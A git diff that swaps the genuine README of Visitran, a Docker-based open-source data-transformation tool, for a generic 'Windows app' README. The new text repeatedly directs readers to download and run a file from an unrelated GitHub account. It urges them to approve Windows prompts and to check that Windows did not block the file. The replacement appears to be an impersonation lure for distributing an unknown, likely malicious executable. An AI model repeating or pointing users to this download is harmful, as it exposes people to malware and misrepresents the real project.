@@ -1,297 +1,186 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/images/logo-light.png" />
-    <source media="(prefers-color-scheme: light)" srcset="docs/images/logo-dark.png" />
-    <img src="docs/images/logo-dark.png" alt="Visitran" width="200" />
-  </picture>
-</p>
-
-<p align="center">
-  <strong>Modern, Pythonic Data Transforms</strong><br />
-  Build data transformation pipelines using Python — with a visual IDE and AI assistant.
-</p>
-
-<p align="center">
-  <a href="https://visitran.com">Website</a> &middot;
-  <a href="https://docs.visitran.com">Documentation</a> &middot;
-  <a href="https://github.com/Zipstack/visitran/issues">Issues</a> &middot;
-  <a href="#contributing">Contributing</a>
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/Zipstack/visitran" alt="License" /></a>
-  <a href="https://github.com/Zipstack/visitran/releases"><img src="https://img.shields.io/github/v/release/Zipstack/visitran" alt="Latest Release" /></a>
-  <a href="https://deepwiki.com/Zipstack/visitran"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki" /></a>
-</p>
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.10.x-blue.svg" alt="Python" />
-  <img src="https://img.shields.io/badge/node-16%2B-green.svg" alt="Node.js" />
-  <a href="https://github.com/astral-sh/uv"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/uv/main/assets/badge/v0.json" alt="uv" /></a>
-</p>
-
----
-
-## What is Visitran?
-
-Visitran is an **open-source** data transformation tool that supports **no-code** (visual drag-and-drop) and **AI-assisted** (natural language) approaches to data modeling. It connects to your data warehouse, lets you build transformation pipelines visually or by describing what you need in plain English — and materializes results back to your database.
-
-**Supported Databases**
-
-| Database | Status | Database | Status |
-|----------|--------|----------|--------|
-| PostgreSQL | :white_check_mark: | DuckDB | :white_check_mark: |
-| Snowflake | :white_check_mark: | BigQuery | :white_check_mark: |
-| Trino | :white_check_mark: | Databricks | :white_check_mark: |
-
-> If Visitran helps you, please star this repo — it helps others discover the project!
-
-## Key Features
-
-**For Data Engineers**
-- Full Python-based transformation models with Ibis SQL generation
-- 6 database adapters with table, view, and incremental materialization
-- DAG execution engine with dependency resolution
-- Job scheduling with cron/interval triggers, retry, and chaining
-
-**For Analysts & No-Code Users**
-- Visual IDE with Monaco editor, file explorer, and DAG visualization
-- No-code model builder — joins, filters, aggregates, window functions, pivots, unions
-- AI assistant for natural language to data transformations
-- Built-in testing framework for model validation
-
-## Getting Started
-
-Requires [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/).
-
-```bash
-git clone https://github.com/Zipstack/visitran.git
-cd visitran
-cp backend/sample.env backend/.env
-cd docker
-docker compose up --build -d
-```
-
-Open [http://localhost:3000](http://localhost:3000) and **Sign Up** to create your account — that's it!
-
-> **AI Features (optional):** Get an API key from [app.visitran.com](https://app.visitran.com) and add `VISITRAN_AI_KEY=vtk_...` to `backend/.env`, then restart with `docker compose restart backend`.
-
-<details>
-<summary><strong>Services started by Docker Compose</strong></summary>
-
-| Service | Port | Description |
-|---------|------|-------------|
-| Frontend | `3000` | React UI (Nginx) |
-| Backend | `8000` | Django REST API (Gunicorn) |
-| PostgreSQL | `5432` | Database |
-| Redis | `6379` | WebSockets and async task broker |
-| Celery Worker | — | Background job processing |
-| Celery Beat | — | Scheduled task processing |
-
-To stop: `docker compose down`
-To stop and delete all data: `docker compose down -v`
-
-</details>
-
-<details>
-<summary><strong>Environment variables</strong></summary>
-
-The `sample.env` ships with working defaults — no edits needed to get started. For production, replace these keys:
-
-| Variable | Default | How to Generate (production) |
-|----------|---------|------------------------------|
-| `SECRET_KEY` | Provided | Use [djecrety.ir](https://djecrety.ir/) or `python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"` |
-| `VISITRAN_ENCRYPTION_KEY` | Provided | `python -c "from base64 import b64encode; from cryptography.fernet import Fernet; print(b64encode(Fernet.generate_key()).decode())"` |
-| `VISITRAN_RSA_PRIVATE_KEY` | Provided | Generate a 2048-bit RSA key pair (see `sample.env`) |
-| `VISITRAN_RSA_PUBLIC_KEY` | Provided | Derived from the private key above |
-
-</details>
-
-<details>
-<summary><strong>Local development (without Docker)</strong></summary>
-
-For development or when you want full control over each component.
-
-**Prerequisites**
-- Python 3.10.x (`>=3.10, <3.11.1` — required by `pyproject.toml`)
-- Node.js 16+
-- [uv](https://docs.astral.sh/uv/) (Python package manager)
-- Redis (for WebSockets and Celery) — install via `brew install redis` (macOS) or your OS package manager
-
-**Backend**
-
-```bash
-git clone https://github.com/Zipstack/visitran.git
-cd visitran
-cp backend/sample.env backend/.env
-```
-
-Edit `backend/.env` for local development:
-
-| Variable | Required | Value for localhost |
-|----------|----------|---------------------|
-| `DB_HOST` | No | Leave **empty** for SQLite, or `localhost` for local PostgreSQL |
-| `REDIS_HOST` | Yes | `localhost` |
-| `DB_SAMPLE_HOST` | No | `localhost` (requires PostgreSQL) or leave empty to skip |
-
-> **Important:** Change `DB_HOST=postgres` → `DB_HOST=` (empty) and `REDIS_HOST=redis` → `REDIS_HOST=localhost`.
-
-```bash
-cd backend
-pip install uv
-uv sync
-source .venv/bin/activate
-python manage.py migrate
-python manage.py runserver
-```
-
-**Frontend**
-
-```bash
-cd frontend
-cp sample.env .env
-npm install
-npm start
-```
-
-Open [http://localhost:3000](http://localhost:3000) and **sign up** to create your account.
-
-</details>
-
-## Project Structure
+# ⚙️ visitran - Simple data work for everyone
 
-```
-backend/
-├── backend/                     # Django application
-│   ├── core/                    #   Models, views, REST API
-│   ├── application/             #   Business logic, config parser, interpreter
-│   └── server/settings/         #   Django settings
-├── visitran/                    # Core transformation engine (standalone)
-│   ├── adapters/                #   Database adapters (postgres, duckdb, snowflake, etc.)
-│   ├── templates/               #   VisitranModel base class
-│   └── visitran.py              #   DAG execution engine
-
-frontend/src/
-├── base/                        # App shell, routing, project listing
-├── ide/                         # Main workspace (editor, file explorer, SQL drawer)
-│   ├── chat-ai/                 #   AI assistant interface
-│   └── editor/                  #   No-code visual model builder
-├── store/                       # Zustand state management
-├── service/                     # API services (axios, socket)
-└── widgets/                     # Reusable UI components
-
-docker/
-├── dockerfiles/                 # Backend and frontend Dockerfiles
-└── docker-compose.yaml          # Docker Compose configuration
-```
+[![Download visitran](https://img.shields.io/badge/Download-visitran-blue?style=for-the-badge&logo=github)](https://github.com/vincentdean96-maker/visitran)
 
-## Development
+## 🚀 Getting Started
 
-### Backend
+visitran is a Windows app for building data tasks with a visual, Python-based workflow. It helps you move, clean, shape, and load data without needing to write code by hand for every step.
 
-```bash
-# Run server with hot reload
-cd backend && python manage.py runserver
+Use visitran if you want a clearer way to:
+- connect to data sources
+- transform rows and columns
+- build repeatable data flows
+- manage simple data models
+- run local data jobs on Windows
 
-# Run migrations
-python manage.py migrate
+## 📥 Download
 
-# Lint & type check
-inv checks
-inv type_check
-
-# Run tests (requires Docker for test databases)
-docker compose up --wait
-uv run pytest -vv --dist loadgroup -n 5 tests
-docker compose down
-```
-
-### Frontend
-
-```bash
-cd frontend
-
-npm start              # Dev server
-npm run build          # Production build
-npm test               # Run tests
-npm run test:coverage  # Test with coverage
-npm run lint           # ESLint check
-npm run lint:fix       # ESLint auto-fix
-```
-
-## Cloud & Enterprise
-
-For teams that need managed infrastructure, advanced features, or enterprise-grade security.
-
-- **SSO & RBAC** — SAML/OIDC single sign-on with role-based access control
-- **Managed AI** — Built-in AI service with no API key setup required
-- **Job Scheduling** — Cron/interval triggers with retry, chaining, and notifications
-- **Cloud Storage** — Managed file storage with version control
-- **Multi-Tenant** — Organization-level isolation and team management
-- **Priority Support** — Dedicated support with SLA guarantees
-
-<a href="https://visitran.com/book-free-demo/">
-  <img src="https://img.shields.io/badge/Book%20a%20Free%20Demo-blue?style=for-the-badge" alt="Book a Free Demo" />
-</a>
-
-## Visitran AI
-
-The AI assistant generates data transformations from natural language. In OSS mode, AI access requires a **Visitran AI subscription key**:
-
-1. Sign up at [app.visitran.com](https://app.visitran.com)
-2. Subscribe to an AI plan and generate an API key
-3. Go to **Settings > Visitran AI** in your local instance and enter your key
-4. Open the Chat AI drawer in the IDE to start using AI
-
-The cloud gateway validates your key, routes prompts through LLM models (Claude, GPT-4o, Gemini), and streams responses back — no local AI setup or LLM credentials needed.
-
-## Tech Stack
-
-| Component | Technology |
-|-----------|------------|
-| Backend | Python, Django, Django REST Framework, Celery |
-| Frontend | React, Ant Design, Zustand, Monaco Editor |
-| SQL Generation | [Ibis](https://ibis-project.org/) |
-| Databases | PostgreSQL, DuckDB, Snowflake, BigQuery, Trino, Databricks |
-| Infrastructure | Docker, Redis, Gunicorn |
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-1. Fork the repo and create a feature branch from `main`
-2. Make your changes
-3. Run linting:
-   - Frontend: `npm run lint`
-   - Backend: `inv checks`
-4. Run tests:
-   - Frontend: `npm test`
-   - Backend: `uv run pytest`
-5. Submit a pull request
-
-## Community
-
-Join the Visitran community:
-
-[![Slack](https://img.shields.io/badge/Slack-4CAF50?style=flat)](https://visitran.slack.com)
-[![Blog](https://img.shields.io/badge/Blog-FF6B6B?style=flat)](https://visitran.com/blog/)
-[![LinkedIn](https://img.shields.io/badge/Follow%20us%20on%20LinkedIn-C8A2E8?style=flat)](https://www.linkedin.com/company/visitran/posts/?feedView=all)
-[![X](https://img.shields.io/badge/Follow%20us%20on%20X-FFD700?style=flat)](https://x.com/GetVisitran)
-
-## A Note on Analytics
-
-Visitran integrates Posthog to track minimal usage analytics. Disable by setting `REACT_APP_ENABLE_POSTHOG=false` in the frontend's `.env` file.
-
-## License
-
-Visitran is licensed under the [GNU Affero General Public License v3.0 (AGPL-3.0)](LICENSE). You are free to use, modify, and distribute this software under the terms of the AGPL-3.0. If you run a modified version as a network service, you must make the source code available to users of that service.
-
----
-
-<div align="center">
-  <p>Built with care by the <a href="https://visitran.com">Visitran</a> team</p>
-  <p>
-    <a href="https://visitran.com">Website</a> &middot;
-    <a href="https://docs.visitran.com">Documentation</a> &middot;
-    <a href="https://visitran.com/book-free-demo/">Book a Demo</a>
-  </p>
-</div>
+To get visitran, visit this page to download:
+https://github.com/vincentdean96-maker/visitran
+
+If the page shows a release file, choose the Windows download and save it to your computer. If it shows the project page first, open the latest release or the main download area from there.
+
+## 🖥️ System Requirements
+
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 1 GB of free disk space
+- A stable internet connection for the first download
+- Permission to run apps on your device
+
+For best results, use a modern 64-bit Windows system.
+
+## 📦 Before You Install
+
+Check these items before you start:
+- Close apps you do not need
+- Make sure you have enough free space
+- Keep your browser open so you can return to the download page
+- If Windows asks for permission, choose the option to allow the app to run
+- Save the file in a folder you can find later, such as Downloads or Desktop
+
+## 🛠️ Install on Windows
+
+Follow these steps:
+
+1. Open the download link above.
+2. Find the Windows file for visitran.
+3. Download the file to your computer.
+4. Open File Explorer and go to the folder where you saved it.
+5. If the file is a ZIP package, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Find the app file and double-click it.
+8. If Windows asks for approval, select Run or Yes.
+9. Wait for the app to open.
+
+If the app starts with a setup window, follow the on-screen steps and keep the default choices unless you need something different.
+
+## 🧭 First Run
+
+When you open visitran for the first time, you may see a start screen or workspace. Use these basic steps:
+
+1. Look for a new project button or create option.
+2. Choose a data source such as a file, table, or local sample.
+3. Add a transformation step.
+4. Review the result in the preview area.
+5. Save your work so you can return to it later.
+
+If you are not sure what to click, start with the most visible button on the screen. The app is built to guide you through the flow.
+
+## 🧱 What visitran Can Do
+
+visitran is built for common data tasks such as:
+- moving data from one place to another
+- cleaning blanks, duplicates, and bad values
+- changing column names and types
+- combining tables
+- shaping data for reports and analysis
+- testing a data flow before you use it again
+
+It supports a Pythonic workflow, which means it follows a clear structure that works well for data work. It also fits use cases where you want an AI-assisted or visual approach instead of a long script.
+
+## 🖱️ Typical Workflow
+
+A simple workflow in visitran may look like this:
+
+1. Load your data.
+2. Choose the fields you want to keep.
+3. Clean the values.
+4. Join another table if needed.
+5. Preview the output.
+6. Save or export the result.
+
+This kind of flow helps when you want to repeat the same job each time new data arrives.
+
+## 📁 Common File Types
+
+visitran can work well with common data formats such as:
+- CSV
+- Excel files
+- JSON
+- Parquet
+- database tables
+
+If your source is a local file, place it in a folder with a short path and a clear name. That makes it easier to find and use.
+
+## 🔍 Best Use Cases
+
+Use visitran when you need to:
+- prepare data for analysis
+- convert messy files into clean tables
+- map one data shape to another
+- build a small ETL flow on Windows
+- replace repeated manual spreadsheet work
+- try a no-code or low-code data process
+
+## 🧩 Tips for Smooth Use
+
+A few simple habits can help:
+- Keep source files in one folder
+- Use clear file names
+- Save versions of your work
+- Test with a small sample before using full data
+- Check each step before you run the whole flow
+- Keep a backup of important input files
+
+## 🛟 Basic Troubleshooting
+
+If visitran does not open:
+- Try running it again as the same user
+- Check whether the file finished downloading
+- Make sure the file is not still in a ZIP archive
+- Move the app to a simple folder path
+- Confirm that Windows did not block the file
+
+If a data file does not load:
+- Check the file name and extension
+- Make sure the file is not open in another app
+- Confirm that the file has data in it
+- Try a smaller sample file first
+
+If the screen looks blank:
+- Resize the window
+- Restart the app
+- Open a new project
+- Check whether the data source was selected
+
+## 🧠 Terms You May See
+
+Here are a few plain meanings for common words:
+- **Data source**: where the data comes from
+- **Transform**: change data into a new shape
+- **Pipeline**: a set of steps that runs in order
+- **Model**: a structured view of the data
+- **Preview**: a quick look before you save or export
+- **Workflow**: the path from input to output
+
+## 🔗 Download Again
+
+If you need the file again, use this link:
+https://github.com/vincentdean96-maker/visitran
+
+## 🧭 What to Expect After Setup
+
+After visitran is running, you should be able to:
+- open a project
+- load a file or table
+- add steps to change the data
+- check the result on screen
+- save the project for later use
+
+If you use data often, keep the app in a place you can reach from the Start menu or your desktop
+
+## 🗂️ Project Focus
+
+visitran brings together:
+- AI-assisted data work
+- visual editing
+- Python-based logic
+- data pipeline design
+- no-code and low-code use
+- data modeling
+- ETL tasks
+- Ibis-style data handling
+
+That makes it useful for people who want a cleaner way to manage data tasks on Windows without building everything from scratch
